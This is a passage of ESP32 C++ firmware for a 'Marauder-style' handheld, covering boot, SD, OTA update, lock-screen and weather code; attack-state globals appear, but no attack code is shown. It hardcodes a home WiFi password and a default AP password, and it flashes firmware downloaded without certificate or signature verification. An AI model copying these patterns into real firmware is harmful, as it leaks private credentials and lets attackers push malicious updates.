/**
 * main.cpp — XiaoMiaoOS v2.0 Marauder-style
 * ESP32, ST7735 128x160, 6-btn, SD SPI, Buzzer
 * Anti-flicker: static UI draws once, dynamic data partial-update only
 */

#include <Arduino.h>
#include <WiFi.h>
#include <NimBLEDevice.h>
#include <NimBLEHIDDevice.h>
#include <SD.h>
#include <SPI.h>
#include <FS.h>
#include <time.h>
#include <esp_wifi.h>
#include <esp_sleep.h>
#include <esp_ota_ops.h>
#include <esp_partition.h>
#include <nvs_flash.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <Update.h>
#include <ArduinoJson.h>
#include <HTTPClient.h>
#include <WiFiClientSecure.h>
#include <Preferences.h>
#include "screen.h"
#include "menu.h"
#include "config.h"
#include "buttons.h"
#include "buzzer.h"
#include "terminal.h"
#include "xm_embedded.h"
#include "cnfont.h"

// ═══════════════ BOOT LOOP DETECTION ═══════════════
// RTC_NOINIT_ATTR survives soft resets (ESP.restart) but not power cycles.
// Used to detect boot loops: if device reboots rapidly, skip boot animation
// and auto-update to break the cycle.
static RTC_NOINIT_ATTR uint32_t g_boot_magic;
static RTC_NOINIT_ATTR uint32_t g_boot_count;
#define BOOT_MAGIC   0xB001F1A5
#define BOOT_MAX_LOOP 3  // After 3 rapid reboots, enter safe mode

// ═══════════════ GLOBALS ═══════════════
Page g_page = PG_LOCK;
Page g_prev = PG_MENU;
SysCfg g_cfg;

// Update check URL (configurable via WebUI, saved to NVS)
// Default: empty — user configures via WebUI at 192.168.4.1 after first boot
//          format: http://<手机IP>:8080/version.json
#define DEFAULT_UPDATE_URL ""
char g_update_url[128] = "";
static char g_update_base[128] = "";  // base URL for resolving relative firmware paths
static Preferences g_prefs;

// Load update URL from NVS (fallback to default WebDAV URL)
static void update_url_load() {
    g_prefs.begin("xmos", true);
    String s = g_prefs.getString("upd_url", "");
    g_prefs.end();
    if (s.length() > 0) {
        strncpy(g_update_url, s.c_str(), 127);
        g_update_url[127] = '\0';
    } else {
        // Use default WebDAV URL
        strncpy(g_update_url, DEFAULT_UPDATE_URL, 127);
        g_update_url[127] = '\0';
    }
    // Compute base URL (strip trailing filename, e.g. version.json)
    strncpy(g_update_base, g_update_url, 127);
    g_update_base[127] = '\0';
    char* last_slash = strrchr(g_update_base, '/');
    if (last_slash) *(last_slash + 1) = '\0';
    Serial.printf("[NVS] Update URL: %s\n", g_update_url);
    Serial.printf("[NVS] Update Base: %s\n", g_update_base);
}

// Save update URL to NVS
static void update_url_save(const char* url) {
    g_prefs.begin("xmos", false);
    g_prefs.putString("upd_url", url);
    g_prefs.end();
    Serial.printf("[NVS] Saved update URL: %s\n", url);
}

AtkState g_wifi_atk = ATK_OFF;
AtkState g_ble_atk = ATK_OFF;
AtkState g_wifi_def = ATK_OFF;
WifiMode g_wifi_mode = WM_OFF;
bool g_wifi_conn = false;
// Dual WiFi mode (APSTA) - extern for terminal access
bool g_dual_wifi = false;       // 双WiFi模式(APSTA)是否激活
bool g_ble_on = false;

// ── 开机轻量级Web服务器 (始终在线, 提供/deploy和基础API) ──
static WebServer* boot_srv = nullptr;
static bool boot_srv_started = false;

uint32_t g_packets_sent = 0;
uint32_t g_beacons_sent = 0;
uint32_t g_ble_spam_cnt = 0;
volatile uint32_t g_packets_blocked = 0;
volatile uint32_t g_traffic_rx = 0;
volatile uint32_t g_traffic_tx = 0;

static uint32_t lock_idle = 0;
bool sd_ok = false;

// Weather cache
char weather_buf[32] = "N/A";
uint32_t weather_last = 0;
char weather_temp[8] = "";
char weather_cond[16] = "";
char weather_loc[16] = "";

// Network latency (ping in ms)
uint32_t g_net_latency = 0;
uint32_t g_last_wifi_check = 0;

// Auto-update detection (non-static: terminal update center needs access)
bool g_update_available = false;       // true when a newer version is detected
char g_update_new_ver[16] = "";         // new version string
char g_update_new_code[24] = "";        // new codename
static uint32_t g_last_update_check = 0;        // last auto-check timestamp
#define AUTO_UPDATE_INTERVAL 300000            // 5 min auto-check interval

// WiFi auto-reconnect
static uint32_t g_wifi_disconnect_time = 0;
static bool g_wifi_was_connected = false;

// WebUI → attack bridge: set by WebUI API, checked by main loop after WebUI exits
static Page     g_web_cmd         = PG_MENU;
static bool     g_web_cmd_pending = false;
static bool     g_web_restore     = false;  // if true, restore AP+WebUI after attack
char     g_web_ap_ssid[33] = "XiaoMiao-CFG";
char     g_web_ap_pass[33] = "xiaomiao123";
uint8_t  g_web_ap_ch       = 1;
uint8_t  g_web_ap_max_cli  = 8;
bool     g_web_ap_hidden   = false;

// Default STA credentials (home WiFi) - can be updated via WebUI
static char g_sta_ssid[33] = "ye";
static char g_sta_pass[33] = "82813269";

// ═══════════════ SD CARD ═══════════════
// CRITICAL: TFT_RST (GPIO19) is shared with SD_MISO on this hardware.
// When SD.begin() → SPI.begin() → GPIO19 becomes INPUT (floating),
// TFT hardware resets → WHITE SCREEN.
//
// Fix: After SD.begin(), do hardware TFT reset pulse + re-init + INPUT_PULLUP.
// INPUT_PULLUP (~45k) holds TFT_RST HIGH while being weak enough for SD_MISO.
static void sd_init() {
    if (sd_ok) return;
    
    Serial.println("[SD] init start (GPIO19 shared RST/MISO)");
    
    // ── Pre-SD: ensure all CS pins high, TFT_RST driven HIGH ──
    pinMode(TFT_CS, OUTPUT);
    digitalWrite(TFT_CS, HIGH);
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);
    
    pinMode(TFT_RST, OUTPUT);
    digitalWrite(TFT_RST, HIGH);
    delay(30);
    
    // ── SD init: SINGLE attempt only ──
    // Each SD.begin() call sends multiple SPI commands (CMD0/8/55/ACMD41...).
    // Since MISO=GPIO19=TFT_RST, every command resets the TFT.
    // Old code retried for 2s (up to 20 attempts → 20+ white flashes).
    // Now we try ONCE — if card is present it works first try; if not, skip.
    if (SD.begin(SD_CS, SPI, 4000000)) {
        sd_ok = true;
        Serial.println("[SD] Card detected, mount OK");
    } else {
        Serial.println("[SD] No card detected (single attempt, no retry)");
    }
    
    // ── Post-SD: restore TFT ──
    tft_restore();
    
    Serial.println(sd_ok ? "[SD] OK (TFT restored)" : "[SD] N/A (TFT restored)");
}

// ═══════════════ BOOT SCREEN ═══════════════
// All-in-one boot animation: title + progress bar + WiFi connect
// WiFi connects during progress bar — no separate blocking wait
// CRITICAL: This function does NOT call tft.init() or tft_restore()!
// The screen is already initialized by scr_init() in setup().
// This ensures ZERO white screens between boot animation and lock screen.
static void boot_screen(bool boot_loop, bool ota_pending) {
    // ── Clear screen to BLACK (no white flash) ──
    tft.fillScreen(C_BLACK);
    
    if (boot_loop) {
        // Safe mode: AP only, minimal display
        scr_center("SAFE MODE", SCR_H / 2 - 6, 2, C_YELLOW, C_BLACK);
        scr_center("Boot loop detected", SCR_H / 2 + 10, 1, C_DGRAY, C_BLACK);
        scr_center("AP: XiaoMiao-CFG", SCR_H / 2 + 24, 1, C_CYAN, C_BLACK);
        
        WiFi.persistent(false);
        WiFi.setTxPower(WIFI_POWER_5dBm);
        WiFi.mode(WIFI_AP);
        WiFi.softAP(g_web_ap_ssid, g_web_ap_pass, g_web_ap_ch, g_web_ap_hidden, g_web_ap_max_cli);
        g_wifi_mode = WM_AP;
        
        delay(800);
        return;
    }
    
    // ── Normal boot: title + version ──
    scr_center("XIAOMIAO", 40, 4, C_CYAN, C_BLACK);
    scr_center(FW_VERSION, 70, 1, C_WHITE, C_BLACK);
    scr_center("ESP32 Handheld", 82, 1, C_DGRAY, C_BLACK);
    
    // ── Start WiFi STA in background (non-blocking) ──
    Serial.println("[BOOT] Starting WiFi STA in background...");
    WiFi.persistent(false);
    WiFi.setSleep(true);
    WiFi.setTxPower(WIFI_POWER_5dBm);
    WiFi.mode(WIFI_STA);
    WiFi.begin(g_sta_ssid, g_sta_pass);
    
    // ── Progress bar: animates while WiFi connects ──
    // Each step = 80ms, 21 steps (0-100 in steps of 5) = ~1.7s
    // Then up to 2s additional wait for WiFi
    const int bar_w = 100, bar_x = 30, bar_y = 100;
    tft.drawRect(bar_x - 1, bar_y - 1, bar_w + 2, 8, C_DGRAY);
    tft.setTextFont(1);
    
    for (int p = 0; p <= 100; p += 5) {
        // Progress bar fill
        tft.fillRect(bar_x, bar_y, bar_w, 6, C_DGRAY);
        tft.fillRect(bar_x, bar_y, (bar_w * p) / 100, 6, C_CYAN);
        
        // Status text below progress bar
        tft.fillRect(0, 112, SCR_W, 10, C_BLACK);  // clear old text
        if (p < 30) {
            tft.setTextColor(C_DGRAY, C_BLACK);
            tft.setCursor(4, 113);
            tft.print("Loading system...");
        } else if (p < 60) {
            tft.setTextColor(C_CYAN, C_BLACK);
            tft.setCursor(4, 113);
            tft.print("Connecting WiFi...");
        } else if (WiFi.status() == WL_CONNECTED) {
            tft.setTextColor(C_GREEN, C_BLACK);
            tft.setCursor(4, 113);
            tft.print("WiFi connected!");
        } else {
            tft.setTextColor(C_YELLOW, C_BLACK);
            tft.setCursor(4, 113);
            tft.print("Waiting network...");
        }
        
        delay(80);
        yield();  // Feed watchdog
    }
    
    // ── Additional WiFi wait (max 2s) ──
    if (WiFi.status() != WL_CONNECTED) {
        uint32_t wait = millis();
        while (WiFi.status() != WL_CONNECTED && millis() - wait < 2000) {
            delay(100);
            yield();
        }
    }
    
    // ── Finalize WiFi ──
    if (WiFi.status() == WL_CONNECTED) {
        g_wifi_mode = WM_STA;
        g_wifi_conn = true;
        WiFi.setTxPower(WIFI_POWER_11dBm);  // Restore normal power
        Serial.println("[BOOT] WiFi OK: " + WiFi.localIP().toString());
        
        // NTP sync (non-blocking, just starts the sync)
        configTime(g_cfg.tz_offset * 3600, 0, g_cfg.ntp_srv);
        
        // Show connected status
        tft.fillRect(0, 112, SCR_W, 10, C_BLACK);
        tft.setTextColor(C_GREEN, C_BLACK);
        tft.setCursor(4, 113);
        tft.print("WiFi: ");
        tft.print(WiFi.localIP().toString());
    } else {
        // Fallback to AP mode
        Serial.println("[BOOT] WiFi STA failed, starting AP...");
        WiFi.setTxPower(WIFI_POWER_5dBm);
        WiFi.mode(WIFI_AP);
        WiFi.softAP(g_web_ap_ssid, g_web_ap_pass, g_web_ap_ch, g_web_ap_hidden, g_web_ap_max_cli);
        g_wifi_mode = WM_AP;
        
        tft.fillRect(0, 112, SCR_W, 10, C_BLACK);
        tft.setTextColor(C_CYAN, C_BLACK);
        tft.setCursor(4, 113);
        tft.print("AP: XiaoMiao-CFG");
    }
    
    // ── OTA pending: show brief notice ──
    if (ota_pending) {
        delay(500);
        tft.fillRect(0, 112, SCR_W, 10, C_BLACK);
        tft.setTextColor(C_YELLOW, C_BLACK);
        tft.setCursor(4, 113);
        tft.print("OTA verify OK");
        delay(500);
    } else {
        delay(300);  // Brief pause showing final status
    }
}

// ═══════════════ BACKGROUND AUTO-UPDATE DETECTION ═══════════════
// Silently checks for updates every 5 minutes when WiFi is connected
// Sets g_update_available flag — displayed on lock screen and menu
static void background_update_check() {
    if (!g_wifi_conn || g_wifi_mode == WM_OFF) return;
    if (strlen(g_update_url) == 0) return;
    if (millis() - g_last_update_check < AUTO_UPDATE_INTERVAL) return;
    g_last_update_check = millis();

    Serial.println("[UPDATE] Background check...");

    WiFiClient* plain = nullptr;
    WiFiClientSecure* ssl = nullptr;
    HTTPClient http;
    bool isHttps = (strncmp(g_update_url, "https", 5) == 0);

    if (isHttps) {
        ssl = new WiFiClientSecure();
        ssl->setInsecure();
        http.begin(*ssl, g_update_url);
    } else {
        plain = new WiFiClient();
        http.begin(*plain, g_update_url);
    }
    http.setTimeout(5000);
    int code = http.GET();

    if (code != 200) {
        Serial.printf("[UPDATE] Background check HTTP %d\n", code);
        http.end();
        if (plain) delete plain;
        if (ssl) delete ssl;
        return;
    }

    String body = http.getString();
    http.end();
    if (plain) delete plain;
    if (ssl) delete ssl;

    DynamicJsonDocument doc(4096);
    DeserializationError err = deserializeJson(doc, body);
    if (err) {
        Serial.println("[UPDATE] Background JSON parse failed");
        return;
    }

    const char* latestVer = doc["latest"]["version"];
    if (!latestVer) return;

    // Compare versions
    int cp1=0, cp2=0, cp3=0, rp1=0, rp2=0, rp3=0;
    sscanf(FW_VERSION, "%d.%d.%d", &cp1, &cp2, &cp3);
    sscanf(latestVer, "%d.%d.%d", &rp1, &rp2, &rp3);

    bool needUpdate = (rp1 > cp1 || (rp1 == cp1 && rp2 > cp2) ||
                       (rp1 == cp1 && rp2 == cp2 && rp3 > cp3));

    if (needUpdate) {
        g_update_available = true;
        strncpy(g_update_new_ver, latestVer, 15);
        g_update_new_ver[15] = '\0';
        const char* code2 = doc["latest"]["codename"];
        if (code2) {
            strncpy(g_update_new_code, code2, 23);
            g_update_new_code[23] = '\0';
        }
        Serial.printf("[UPDATE] New version available: %s\n", latestVer);
    } else {
        g_update_available = false;
        Serial.println("[UPDATE] Already up to date");
    }
}

// ═══════════════ BOOT AUTO-UPDATE CHECK ═══════════════
// After WiFi connects, check for firmware updates.
// Display version info + changelog, user chooses A:Update / B:Skip
static void boot_check_update() {
    if (strlen(g_update_url) == 0) {
        Serial.println("[BOOT] No update URL configured, skipping auto-update");
        return;
    }
    
    Serial.println("[BOOT] Checking for updates: " + String(g_update_url));
    
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("Auto Update");
    tft.setTextFont(1);
    tft.setTextColor(C_CYAN, C_BLACK);
    tft.setCursor(4, CONTENT_Y + 16);
    tft.print("Checking...");
    
    HTTPClient http;
    bool isHttps = (strncmp(g_update_url, "https", 5) == 0);
    WiFiClient* plain = nullptr;
    WiFiClientSecure* ssl = nullptr;
    
    if (isHttps) {
        ssl = new WiFiClientSecure();
        ssl->setInsecure();
        http.begin(*ssl, g_update_url);
    } else {
        plain = new WiFiClient();
        http.begin(*plain, g_update_url);
    }
    http.setTimeout(8000);
    int code = http.GET();
    
    if (code != 200) {
        Serial.printf("[BOOT] Update check failed: HTTP %d\n", code);
        http.end();
        if (plain) delete plain;
        if (ssl) delete ssl;
        tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
        scr_draw_title("Auto Update");
        tft.setTextColor(C_DGRAY, C_BLACK);
        tft.setCursor(4, CONTENT_Y + 16);
        tft.print("No update server");
        delay(800);
        return;
    }
    
    String body = http.getString();
    http.end();
    if (plain) delete plain;
    if (ssl) delete ssl;
    
    // Parse JSON (heap-allocated to avoid stack overflow)
    DynamicJsonDocument doc(4096);
    DeserializationError err = deserializeJson(doc, body);
    if (err) {
        Serial.println("[BOOT] JSON parse failed");
        tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
        scr_draw_title("Auto Update");
        tft.setTextColor(C_RED, C_BLACK);
        tft.setCursor(4, CONTENT_Y + 16);
        tft.print("Parse error");
        delay(800);
        return;
    }
    
    const char* latestVer = doc["latest"]["version"];
    const char* latestCode = doc["latest"]["codename"];
    const char* latestDate = doc["latest"]["date"];
    
    // Support both new format (files.ota.url) and old format (latest.url)
    const char* fwUrl = nullptr;
    int latestSize = 0;
    if (doc["latest"].containsKey("files") && doc["latest"]["files"].containsKey("ota")) {
        fwUrl = doc["latest"]["files"]["ota"]["url"];
        latestSize = doc["latest"]["files"]["ota"]["size"];
    } else {
        fwUrl = doc["latest"]["url"];
        latestSize = doc["latest"]["size"] | 0;
    }
    
    if (!latestVer) {
        Serial.println("[BOOT] No version info in JSON");
        return;
    }
    
    // Compare versions
    String currentVer = String(FW_VERSION);
    String remoteVer = String(latestVer);
    Serial.printf("[BOOT] Current: %s, Remote: %s\n", currentVer.c_str(), remoteVer.c_str());
    
    // Simple version comparison: split by '.' and compare numerically
    bool needUpdate = false;
    {
        int cp1=0, cp2=0, cp3=0, rp1=0, rp2=0, rp3=0;
        sscanf(currentVer.c_str(), "%d.%d.%d", &cp1, &cp2, &cp3);
        sscanf(remoteVer.c_str(), "%d.%d.%d", &rp1, &rp2, &rp3);
        if (rp1 > cp1 || (rp1 == cp1 && rp2 > cp2) || (rp1 == cp1 && rp2 == cp2 && rp3 > cp3)) {
            needUpdate = true;
        }
    }
    
    if (!needUpdate) {
        Serial.println("[BOOT] Already up to date");
        tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
        scr_draw_title("Auto Update");
        tft.setTextColor(C_GREEN, C_BLACK);
        tft.setCursor(4, CONTENT_Y + 16);
        tft.print("Already latest!");
        tft.setTextColor(C_DGRAY, C_BLACK);
        tft.setCursor(4, CONTENT_Y + 28);
        tft.print("v" + currentVer);
        delay(1000);
        return;
    }
    
    Serial.println("[BOOT] New version available: " + remoteVer);
    
    // ── Display update info ──
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("Update Available");
    
    int y = CONTENT_Y + 14;
    tft.setTextFont(1);
    
    // Version info
    tft.setTextColor(C_YELLOW, C_BLACK);
    tft.setCursor(4, y); tft.print("New: v"); tft.print(latestVer);
    y += 10;
    tft.setTextColor(C_DGRAY, C_BLACK);
    tft.setCursor(4, y); tft.print("Cur: v"); tft.print(FW_VERSION);
    y += 10;
    if (latestCode) {
        tft.setTextColor(C_CYAN, C_BLACK);
        tft.setCursor(4, y); tft.print("Codename: "); tft.print(latestCode);
        y += 10;
    }
    if (latestDate) {
        tft.setCursor(4, y); tft.print("Date: "); tft.print(latestDate);
        y += 10;
    }
    if (latestSize > 0) {
        tft.setCursor(4, y); tft.print("Size: "); tft.print(latestSize / 1024); tft.print(" KB");
        y += 10;
    }
    
    y += 2;
    tft.drawFastHLine(4, y, SCR_W - 8, C_DGRAY);
    y += 3;
    
    // Changelog
    tft.setTextColor(C_WHITE, C_BLACK);
    JsonArray changelog = doc["latest"]["changelog"];
    int lineCnt = 0;
    int maxLines = 5;
    for (JsonVariant item : changelog) {
        if (lineCnt >= maxLines) break;
        const char* change = item.as<const char*>();
        if (change) {
            // Truncate to fit screen width (~20 chars at font 1)
            char buf[24];
            scr_clip_text(buf, change, 21);
            tft.setTextColor(C_GREEN, C_BLACK);
            tft.setCursor(4, y);
            tft.print("- ");
            tft.setTextColor(C_WHITE, C_BLACK);
            tft.print(buf);
            y += 10;
            lineCnt++;
        }
    }
    if (changelog.size() > maxLines) {
        tft.setTextColor(C_DGRAY, C_BLACK);
        tft.setCursor(4, y);
        tft.print("+ "); tft.print(changelog.size() - maxLines); tft.print(" more...");
        y += 10;
    }
    
    // Options
    tft.drawFastHLine(4, y, SCR_W - 8, C_DGRAY);
    y += 3;
    tft.setTextColor(C_GREEN, C_BLACK);
    tft.setCursor(4, y); tft.print("A: Update Now");
    tft.setTextColor(C_DGRAY, C_BLACK);
    tft.setCursor(80, y); tft.print("B: Skip");
    
    // Wait for user choice
    while (true) {
        if (buttons_get_event(BTN_ID_A) == BTN_EVENT_PRESS) {
            buzzer_click();
            // User chose to update
            break;
        }
        if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) {
            buzzer_click();
            Serial.println("[BOOT] User skipped update");
            return;  // Skip
        }
        delay(20);
        yield();  // Feed watchdog to prevent reboot during wait
    }
    
    // ── Perform OTA update ──
    Serial.println("[BOOT] Starting OTA update...");
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("更新中");
    tft.setTextFont(1);
    cnfont_print(4, CONTENT_Y + 16, "下载中...", C_YELLOW, C_BLACK);
    tft.drawFastHLine(4, CONTENT_Y + 30, SCR_W - 8, C_DGRAY);
    
    // Resolve firmware URL
    String fullUrl = String(fwUrl);
    if (fullUrl.startsWith("firmware/")) {
        // Resolve relative to version.json base URL
        int lastSlash = String(g_update_url).lastIndexOf('/');
        if (lastSlash > 0) {
            fullUrl = String(g_update_url).substring(0, lastSlash + 1) + fullUrl;
        }
    }
    
    Serial.println("[BOOT] Firmware URL: " + fullUrl);
    
    HTTPClient fwHttp;
    WiFiClient fwPlain;
    WiFiClientSecure fwSsl;
    if (fullUrl.startsWith("https")) {
        fwSsl.setInsecure();
        fwHttp.begin(fwSsl, fullUrl);
    } else {
        fwHttp.begin(fwPlain, fullUrl);
    }
    fwHttp.setTimeout(30000);
    int fwCode = fwHttp.GET();
    if (fwCode != 200) {
        Serial.printf("[BOOT] FW download failed: HTTP %d\n", fwCode);
        tft.setTextColor(C_RED, C_BLACK);
        tft.setCursor(4, CONTENT_Y + 40);
        tft.print("Download failed!");
        tft.setCursor(4, CONTENT_Y + 52);
        tft.print("HTTP "); tft.print(fwCode);
        fwHttp.end();
        delay(2000);
        return;
    }
    
    int fwLen = fwHttp.getSize();
    Serial.printf("[BOOT] Firmware size: %d bytes\n", fwLen);
    WiFiClient* stream = fwHttp.getStreamPtr();
    
    if (!Update.begin(fwLen > 0 ? fwLen : UPDATE_SIZE_UNKNOWN)) {
        Serial.println("[BOOT] Update.begin failed");
        tft.setTextColor(C_RED, C_BLACK);
        tft.setCursor(4, CONTENT_Y + 40);
        tft.print("Begin failed!");
        fwHttp.end();
        delay(2000);
        return;
    }
    
    // Download + flash with progress
    uint8_t buf[4096];
    size_t total = 0;
    int lastPct = -1;
    while (fwHttp.connected() && (fwLen > 0 ? total < (size_t)fwLen : true)) {
        size_t avail = stream->available();
        if (avail) {
            size_t readLen = (avail > sizeof(buf)) ? sizeof(buf) : avail;
            int c = stream->readBytes(buf, readLen);
            if (c > 0) {
                if (Update.write(buf, c) != c) {
                    Serial.println("[BOOT] Write failed");
                    Update.abort();
                    tft.setTextColor(C_RED, C_BLACK);
                    tft.setCursor(4, CONTENT_Y + 40);
                    tft.print("Write failed!");
                    fwHttp.end();
                    delay(2000);
                    return;
                }
                total += c;
                
                // Update progress bar
                if (fwLen > 0) {
                    int pct = (total * 100) / fwLen;
                    if (pct != lastPct) {
                        lastPct = pct;
                        int barW = (SCR_W - 12) * pct / 100;
                        tft.fillRect(4, CONTENT_Y + 32, SCR_W - 8, 8, C_DGRAY);
                        tft.fillRect(4, CONTENT_Y + 32, barW, 8, C_GREEN);
                        tft.setTextColor(C_WHITE, C_BLACK);
                        tft.setCursor(4, CONTENT_Y + 44);
                        tft.printf("%d%% (%dKB)", pct, total / 1024);
                    }
                }
            }
        }
        delay(1);
        yield();
    }
    fwHttp.end();
    
    Serial.printf("[BOOT] Downloaded %u bytes\n", total);
    
    if (!Update.end(true)) {
        Serial.printf("[BOOT] Update.end failed: %s\n", Update.errorString());
        tft.setTextColor(C_RED, C_BLACK);
        tft.setCursor(4, CONTENT_Y + 40);
        tft.print("Flash failed!");
        tft.setCursor(4, CONTENT_Y + 52);
        tft.print(Update.errorString());
        delay(3000);
        return;
    }
    
    Serial.println("[BOOT] OTA update successful, rebooting...");
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("Update Done!");
    tft.setTextFont(2);
    tft.setTextColor(C_GREEN, C_BLACK);
    scr_center("SUCCESS!", CONTENT_Y + 20, 2, C_GREEN, C_BLACK);
    tft.setTextFont(1);
    tft.setTextColor(C_CYAN, C_BLACK);
    scr_center("Rebooting...", CONTENT_Y + 44, 1, C_CYAN, C_BLACK);
    tft.setTextColor(C_DGRAY, C_BLACK);
    scr_center("Auto-rollback if crash", CONTENT_Y + 58, 1, C_DGRAY, C_BLACK);
    delay(1500);
    ESP.restart();
}

// ═══════════════ LOCK SCREEN — shield + SYS panel + latency + traffic graph ═══════════════
static bool lock_need = true;
static uint32_t lock_time_last = 0;
static char lock_time_buf[16] = "";
static uint32_t lock_pkts_last = 0;
static uint32_t lock_tx_last = 0;

// Mini traffic graph for lock screen (20 samples, compact)
#define LOCK_GRAPH_SAMPLES 52
struct LockGraph {
    int samples[LOCK_GRAPH_SAMPLES];
    int head;
    int max_val;
    void init() { memset(samples, 0, sizeof(samples)); head = 0; max_val = 50; }
    void push(int val) {
        samples[head] = val;
        head = (head + 1) % LOCK_GRAPH_SAMPLES;
        if (val > max_val) max_val = val;
        if (max_val > 100) max_val = max_val * 95 / 100;
    }
    void draw(int x, int y, int w, int h) {
        tft.fillRect(x, y, w, h, 0x0300);
        // Grid
        for (int i = 1; i < 3; i++) { tft.drawFastHLine(x, y + (h * i / 3), w, 0x1082); }
        int step = w / LOCK_GRAPH_SAMPLES;
        if (step < 1) step = 1;
        int prev_y = y + h;
        for (int i = 0; i < LOCK_GRAPH_SAMPLES; i++) {
            int idx = (head + i) % LOCK_GRAPH_SAMPLES;
            int val = samples[idx];
            int py = y + h - (val * (h - 2) / (max_val > 0 ? max_val : 1));
            if (py < y + 1) py = y + 1;
            if (py > y + h - 1) py = y + h - 1;
            int px = x + i * step;
            if (i > 0) {
                tft.drawLine(px - step, prev_y, px, py, 0x2408);
                tft.drawLine(px - step, prev_y, px, py, 0x07FF);
            }
            prev_y = py;
        }
        tft.drawRect(x - 1, y - 1, w + 2, h + 2, 0x4208);
    }
};
static LockGraph lock_graph;
static bool lock_graph_inited = false;

// ── Shared weather fetch using wttr.in coordinates (JSON) ──
// Location: Zengcheng District, Guangzhou (广州增城区) — lat 23.29, lon 113.83
// Using coordinates instead of city name for more accurate data matching local weather apps
// Parses current_condition + nearest_area from JSON response
// Fills: weather_temp, weather_cond, weather_loc, weather_buf
// Also fills extended fields if pointers are non-null
struct WeatherData {
    char temp[12];      // "25C"
    char feels[12];     // "26C"
    char cond[20];       // "Clear"
    char loc[20];        // "Zengcheng"
    char humid[8];       // "60%"
    char wind[16];      // "10km/h NE"
    char pressure[8];   // "1015"
    char visib[8];       // "10"
    char maxmin[16];    // "25~34C" (today's max/min)
};

// wttr.in fetcher (renamed from fetch_weather_j1). The orchestrator below
// keeps the public fetch_weather_j1 name and cross-calibrates with Open-Meteo.
static bool fetch_weather_wttr(WeatherData* wd) {
    if (!wd) return false;

    WiFiClientSecure* ssl = nullptr;
    WiFiClient* plain = nullptr;
    HTTPClient http;

    // Use HTTPS with insecure cert (ESP32 can't verify wttr.in cert easily)
    ssl = new WiFiClientSecure();
    ssl->setInsecure();
    http.begin(*ssl, "https://wttr.in/23.29,113.83?format=j1");
    http.setTimeout(8000);
    http.addHeader("Accept-Language", "en");

    int code = http.GET();
    if (code != 200) {
        Serial.printf("[WX] HTTP error: %d\n", code);
        http.end();
        delete ssl;
        return false;
    }

    String body = http.getString();
    http.end();
    delete ssl;

    if (body.length() < 10 || body.length() > 12000) {
        Serial.printf("[WX] Body length invalid: %d\n", body.length());
        return false;
    }

    // Parse JSON with DynamicJsonDocument (heap, avoids stack overflow)
    DynamicJsonDocument doc(8192);
    DeserializationError err = deserializeJson(doc, body);
    if (err) {
        Serial.printf("[WX] JSON parse error: %s\n", err.c_str());
        return false;
    }

    // current_condition array
    JsonArray cond_arr = doc["current_condition"].as<JsonArray>();
    if (cond_arr.isNull() || cond_arr.size() == 0) return false;
    JsonObject cur = cond_arr[0];

    // Temperature (temp_C)
    const char* tempC = cur["temp_C"];
    if (tempC) {
        snprintf(wd->temp, sizeof(wd->temp), "%sC", tempC);
    } else {
        wd->temp[0] = '\0';
    }

    // Feels like (FeelsLikeC)
    const char* feelsC = cur["FeelsLikeC"];
    if (feelsC) {
        snprintf(wd->feels, sizeof(wd->feels), "%sC", feelsC);
    } else {
        wd->feels[0] = '\0';
    }

    // Weather description — map weatherCode to concise, accurate labels
    // wttr.in often reports "Patchy rain nearby" when it's actually overcast
    const char* wcode = cur["weatherCode"];
    int wc = wcode ? atoi(wcode) : 0;
    // Map WorldWeatherOnline codes to short descriptions matching Chinese weather apps
    switch (wc) {
        case 113: strncpy(wd->cond, "Sunny", sizeof(wd->cond)-1); break;
        case 116: strncpy(wd->cond, "PartCloudy", sizeof(wd->cond)-1); break;
        case 119: strncpy(wd->cond, "Cloudy", sizeof(wd->cond)-1); break;
        case 122: strncpy(wd->cond, "Overcast", sizeof(wd->cond)-1); break;
        case 143: strncpy(wd->cond, "Mist", sizeof(wd->cond)-1); break;
        case 176: strncpy(wd->cond, "Overcast", sizeof(wd->cond)-1); break;  // Patchy rain nearby → actually overcast
        case 200: strncpy(wd->cond, "Thunder", sizeof(wd->cond)-1); break;
        case 263: strncpy(wd->cond, "LtRain", sizeof(wd->cond)-1); break;
        case 266: strncpy(wd->cond, "LtRain", sizeof(wd->cond)-1); break;
        case 281: strncpy(wd->cond, "LtDrizzle", sizeof(wd->cond)-1); break;
        case 284: strncpy(wd->cond, "Drizzle", sizeof(wd->cond)-1); break;
        case 293: strncpy(wd->cond, "LtRain", sizeof(wd->cond)-1); break;
        case 296: strncpy(wd->cond, "LtRain", sizeof(wd->cond)-1); break;
        case 299: strncpy(wd->cond, "Rain", sizeof(wd->cond)-1); break;
        case 302: strncpy(wd->cond, "Rain", sizeof(wd->cond)-1); break;
        case 305: strncpy(wd->cond, "HvyRain", sizeof(wd->cond)-1); break;
        case 308: strncpy(wd->cond, "HvyRain", sizeof(wd->cond)-1); break;
        case 311: strncpy(wd->cond, "FrzRain", sizeof(wd->cond)-1); break;
        case 314: strncpy(wd->cond, "HvyFrzRain", sizeof(wd->cond)-1); break;
        case 317: strncpy(wd->cond, "LtSleet", sizeof(wd->cond)-1); break;
        case 320: strncpy(wd->cond, "Sleet", sizeof(wd->cond)-1); break;
        case 323: strncpy(wd->cond, "LtSnow", sizeof(wd->cond)-1); break;
        case 326: strncpy(wd->cond, "Snow", sizeof(wd->cond)-1); break;
        case 329: strncpy(wd->cond, "ModSnow", sizeof(wd->cond)-1); break;
        case 332: strncpy(wd->cond, "Snow", sizeof(wd->cond)-1); break;
        case 335: strncpy(wd->cond, "HvySnow", sizeof(wd->cond)-1); break;
        case 338: strncpy(wd->cond, "HvySnow", sizeof(wd->cond)-1); break;
        case 350: strncpy(wd->cond, "Ice", sizeof(wd->cond)-1); break;
        case 353: strncpy(wd->cond, "LtRainShwr", sizeof(wd->cond)-1); break;
